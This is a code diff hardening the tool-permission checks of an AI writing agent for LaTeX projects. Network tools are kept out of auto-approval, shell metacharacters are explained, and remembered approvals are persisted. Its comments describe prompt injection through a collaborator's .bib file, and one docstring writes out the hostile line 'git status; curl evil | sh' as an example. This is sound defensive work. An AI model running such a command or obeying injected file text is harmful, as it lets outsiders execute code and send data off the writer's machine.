@@ -120,9 +120,22 @@ READING_TOOLS = frozenset({"Read", "NotebookRead", "Glob", "Grep"})
 # the chained, piped, substituted or redirected command -- which is how an
 # injected sentence in somebody else's `.bib` file escalates -- gets a card
 # even in auto mode.
+# Reaching the network is held back for a second reason, and it is the one
+# auto mode sharpens rather than softens.  The model's context is assembled
+# out of the project's files, which arrive from a template, a clone or a
+# collaborator, so a sentence in somebody else's `.bib` file can choose both
+# the address and what is sent to it.  Ordinary mode puts a card in front of
+# that.  Auto mode approved it in silence, which is precisely the situation
+# with nobody watching: the switch meaning "stop asking about my own
+# writing" was also answering a question about somebody else's.
+NETWORK_TOOLS = frozenset({"WebFetch", "WebSearch"})
+
+
 def _auto_covers(tool_name: str, rule: str) -> bool:
     if tool_name in ("Bash", "BashOutput", "KillShell"):
         return bool(rule)
+    if tool_name in NETWORK_TOOLS:
+        return False
     return True
 
 _HOW_TO_WORK = """\
@@ -176,9 +189,32 @@ style; the second is about how the file is laid out rather than how the
 prose reads, so a voice description cannot be about it."""
 
 
-# Characters that let one command line run more than one command.  A rule
-# scoped to a first word means nothing in their presence.
-SHELL_SYNTAX = ";&|`$><\n"
+# Characters that let one command line be more than the command it starts
+# with.  A rule scoped to a first word means nothing in their presence.
+#
+# Each is paired with what it actually does, because the card used to say
+# "it runs more than one command" about all of them, and that is true of
+# four.  A writer told that `latexmk > build.log` runs more than one command
+# has been told something false, and what they learn from it is that the
+# explanations here are not worth reading.
+SHELL_SYNTAX = {
+    ";": "runs a second command after this one ( ; )",
+    "&": "chains or backgrounds another command ( & )",
+    "|": "pipes this into another command ( | )",
+    "`": "substitutes the output of another command ( ` )",
+    "$": "expands a shell expression, which can be another command ( $ )",
+    ">": "redirects output into a file ( > )",
+    "<": "takes its input from a file ( < )",
+    "\n": "is more than one line",
+}
+
+
+def shell_syntax_in(command: str) -> str:
+    """What in this command line makes a first-word rule meaningless, if anything."""
+    for character in command:
+        if character in SHELL_SYNTAX:
+            return SHELL_SYNTAX[character]
+    return ""
 
 
 @dataclass
@@ -251,11 +287,20 @@ class ProjectAgent:
         # A permission request in flight, waiting on the browser.
         self._pending: dict[str, asyncio.Future] = {}
         # Prefixes the user chose to always allow, e.g. "Bash:latexmk".
-        self._always_allow: set[str] = set()
+        # Persisted, because the README says the permission rules you have
+        # set carry over and they did not: this lived in memory, so a
+        # restart, or the half hour of quiet that evicts a session, asked
+        # the writer again about a build command they had already answered
+        # for good.
+        self._always_allow: set[str] = self._load_allow()
         # Approve without asking.  Persisted per project, and deliberately
         # not in `nexttex.toml`: that file is committed with the writing, and
         # a switch that lowers the permission fence must not travel to
-        # somebody else's machine in a git clone.
+        # somebody else's machine in a git clone.  The same reasoning covers
+        # the remembered rules above, and the same file holds them: the
+        # state directory is inside the project and ignores itself, and a
+        # peer is refused it outright, so neither a clone nor a share can
+        # carry a lowered fence onto another machine.
         self.auto = self._load_auto()
         # Edits made this turn, drained by the caller into the transcript.
         self._edits: list[EditRecord] = []
@@ -302,21 +347,46 @@ class ProjectAgent:
     def _auto_path(self) -> Path:
         return self.state_dir / "agent-settings.json"
 
-    def _load_auto(self) -> bool:
+    def _stored_settings(self) -> dict:
         try:
-            return bool(json.loads(self._auto_path.read_text()).get("auto", False))
+            stored = json.loads(self._auto_path.read_text())
         except (OSError, json.JSONDecodeError):
-            return False
+            return {}
+        return stored if isinstance(stored, dict) else {}
 
-    def set_auto(self, on: bool) -> None:
-        self.auto = bool(on)
+    def _load_auto(self) -> bool:
+        return bool(self._stored_settings().get("auto", False))
+
+    def _load_allow(self) -> set[str]:
+        """The rules answered with "always" in an earlier session.
+
+        Anything that is not a list of strings is read as nothing rather
+        than as an error: a settings file somebody hand-edited should cost
+        an answer that has to be given again, never a project that will not
+        open.
+        """
+        stored = self._stored_settings().get("allow")
+        if not isinstance(stored, list):
+            return set()
+        return {rule for rule in stored if isinstance(rule, str) and rule}
+
+    def _save_settings(self) -> None:
         try:
             self.state_dir.mkdir(parents=True, exist_ok=True)
             temp = self._auto_path.with_suffix(".json.tmp")
-            temp.write_text(json.dumps({"auto": self.auto}), encoding="utf-8")
+            temp.write_text(
+                json.dumps(
+                    {"auto": self.auto, "allow": sorted(self._always_allow)}
+                ),
+                encoding="utf-8",
+            )
             temp.replace(self._auto_path)
         except OSError:
             pass
+
+    def set_auto(self, on: bool) -> None:
+        self.auto = bool(on)
+        self._save_settings()
 
     # -- permissions -------------------------------------------------------
     def _inside_project(self, raw: Any) -> bool:
@@ -392,7 +462,7 @@ class ProjectAgent:
         """
         if tool_name == "Bash":
             command = (data.get("command") or "").strip()
-            if any(character in command for character in SHELL_SYNTAX):
+            if shell_syntax_in(command):
                 return ""
             first = command.split()[0] if command else ""
             return f"Bash:{first}"
@@ -417,13 +487,69 @@ class ProjectAgent:
             return f"{self._PATH_VERB.get(tool_name, 'use')}:{target}"
         return tool_name
 
+    def _memo_for(self, tool_name: str, data: dict) -> str:
+        """What an "always" answer remembers, which is not always the rule.
+
+        These are deliberately two things.  `_rule_for` decides what auto
+        mode covers, and it returns nothing for a command carrying shell
+        syntax so that such a command is asked about every time however
+        firmly the switch is on.  Making it return something so the button
+        could appear would have widened auto mode by a side effect, which is
+        the opposite of what was wanted.
+
+        So a compound command is remembered by its exact text instead, under
+        a prefix a first-word rule can never collide with.  That is the only
+        promise this fence can keep about it: `Bash:git` would have covered
+        `git status; curl evil | sh`, and `Bash!latexmk -pdf main.tex >
+        build.log` covers exactly itself and nothing else.
+
+        Worth knowing what it buys, because it is not silence.  It helps
+        when the model reissues a byte-identical command, and models vary
+        their whitespace and their flags, so auto mode gets quieter rather
+        than quiet.
+        """
+        rule = self._rule_for(tool_name, data)
+        if rule:
+            return rule
+        if tool_name == "Bash":
+            command = (data.get("command") or "").strip()
+            if command:
+                return f"Bash!{command}"
+        return ""
+
+    def _why_asked(self, tool_name: str, data: dict) -> str:
+        """Which rule put this card up, from the same facts the fence used.
+
+        Worked out here rather than passed in from the fence, so that a card
+        cannot describe one rule while another one is the reason it exists.
+        That is what went wrong before: a write to a `latexmkrc` was
+        announced as a write outside the project, which was false twice
+        over, since the file is inside the project and the rule that fired
+        was the one about files the build executes.
+        """
+        if tool_name == "Bash":
+            return "shell" if shell_syntax_in(data.get("command") or "") else ""
+        if tool_name in NETWORK_TOOLS:
+            return "network"
+        raw = data.get("file_path") or data.get("path") or data.get("notebook_path")
+        if raw is None:
+            return ""
+        if not self._inside_project(raw):
+            return "outside"
+        if self._is_control_file(raw):
+            return "control"
+        return ""
+
     def describe(self, tool_name: str, data: dict) -> dict:
         """Plain-English headline and detail for a permission card."""
+        why = self._why_asked(tool_name, data)
         if tool_name == "Bash":
+            command = data.get("command", "")
             return {
                 "headline": "Run a shell command",
-                "detail": data.get("command", ""),
+                "detail": command,
                 "consequence": data.get("description", ""),
+                "reason": self._reason(why, shell_syntax_in(command)),
             }
         path = data.get("file_path") or data.get("path") or ""
         display = path
@@ -431,17 +557,29 @@ class ProjectAgent:
             display = str(Path(path).resolve().relative_to(self.root))
         except (ValueError, OSError):
             pass
+        if why == "control":
+            return {
+                "headline": f"Change a file that the build runs: {display}",
+                "detail": path,
+                "consequence": "This file is inside the project, but it is "
+                               "machinery rather than writing: a latexmkrc is "
+                               "Perl that the next build executes, and a "
+                               ".git/config names commands that git runs.",
+                "reason": self._reason(why, ""),
+            }
         if tool_name in READING_TOOLS:
             return {
                 "headline": f"Read a file outside the project: {display}",
                 "detail": path,
                 "consequence": "This file is not part of this writing project.",
+                "reason": self._reason(why, ""),
             }
         if tool_name in {"Write", "Edit", "MultiEdit", "NotebookEdit"}:
             return {
                 "headline": f"Write outside the project: {display}",
                 "detail": path,
                 "consequence": "This file is not part of this writing project.",
+                "reason": self._reason(why, ""),
             }
         if tool_name == "WebFetch":
             url = str(data.get("url") or data.get("prompt") or "")[:200]
@@ -451,6 +589,7 @@ class ProjectAgent:
                 "consequence": "This is the first thing in a turn that leaves "
                                "this machine, and what it sends is chosen from "
                                "what the project's files say.",
+                "reason": self._reason(why, ""),
             }
         if tool_name == "WebSearch":
             query = str(data.get("query") or "")[:200]
@@ -458,9 +597,41 @@ class ProjectAgent:
                 "headline": "Search the web",
                 "detail": query,
                 "consequence": "The search terms leave this machine.",
+                "reason": self._reason(why, ""),
             }
         return {"headline": f"Use {tool_name}", "detail": json.dumps(data)[:400],
-                "consequence": ""}
+                "consequence": "", "reason": self._reason(why, "")}
+
+    @staticmethod
+    def _reason(why: str, syntax: str) -> str:
+        """One sentence saying which rule put this card up.
+
+        Empty when the switch is off, because then the answer is simply that
+        this app asks before it acts, and a sentence explaining that on every
+        card is a sentence people stop reading.
+        """
+        if why == "shell":
+            said = syntax or "is more than the command it starts with"
+            return (
+                f"Asked even with auto mode on: this command {said}, so a rule "
+                "scoped to its first word would not mean what it says."
+            )
+        if why == "control":
+            return (
+                "Asked even with auto mode on, because approving the writing "
+                "is not approving the machinery that runs it."
+            )
+        if why == "outside":
+            return (
+                "Asked even with auto mode on: this is the one action that "
+                "leaves the project the agent was pointed at."
+            )
+        if why == "network":
+            return (
+                "Asked even with auto mode on, because what is sent and where "
+                "it goes are chosen from files that may not be yours."
+            )
+        return ""
 
     def resolve_permission(self, request_id: str, decision: str) -> bool:
         future = self._pending.get(request_id)
@@ -563,6 +734,11 @@ class ProjectAgent:
             # A control file inside the project arrives here too, and for
             # the same reason: `latexmkrc` is Perl, `.git/config` names a
             # command that `git status` runs, and neither is the writing.
+            #
+            # Which of the two it is has to travel with the request.  Both
+            # used to draw the same card, so a write to a `latexmkrc` was
+            # announced as a write outside the project, and the writer was
+            # asked to agree to something that was not happening.
             decision = await self._ask_user(tool_name, tool_input)
             if decision in {"allow", "always"}:
                 return self._allow()
@@ -610,13 +786,13 @@ class ProjectAgent:
         })
 
     async def _ask_user_would_return(self, tool_name: str, tool_input: dict) -> bool:
-        """Whether a remembered rule already covers this call, without asking."""
-        rule = self._rule_for(tool_name, tool_input)
+        """Whether a remembered answer already covers this call, without asking."""
+        rule = self._memo_for(tool_name, tool_input)
         return bool(rule) and rule in self._always_allow
 
     async def _ask_user(self, tool_name: str, tool_input: dict) -> str:
         """Put a permission card in front of the user and wait for the answer."""
-        rule = self._rule_for(tool_name, tool_input)
+        rule = self._memo_for(tool_name, tool_input)
         if rule and rule in self._always_allow:
             # Recorded rather than silent.  A rule the writer set earlier is
             # still an action taken on their document, and the transcript is
@@ -664,11 +840,17 @@ class ProjectAgent:
             self._pending.pop(request_id, None)
 
         if decision == "always":
-            # An empty rule means nothing could be scoped safely -- a Bash
-            # command with shell syntax in it.  Honour the allow, remember
-            # nothing: the card comes back next time, which is the point.
+            # An empty key means there was nothing nameable to remember: a
+            # path tool whose argument is not a path at all.  Honour the
+            # allow and remember nothing, so the card comes back.
+            #
+            # A compound shell command does get a key now, its own exact
+            # text, and remembering it does not widen what auto mode covers:
+            # that is still decided by `_rule_for`, which returns nothing
+            # here and goes on doing so.
             if rule:
                 self._always_allow.add(rule)
+                self._save_settings()
         return decision
 
     async def _post_tool(self, input_data: dict, tool_use_id: str | None, ctx: Any) -> dict:
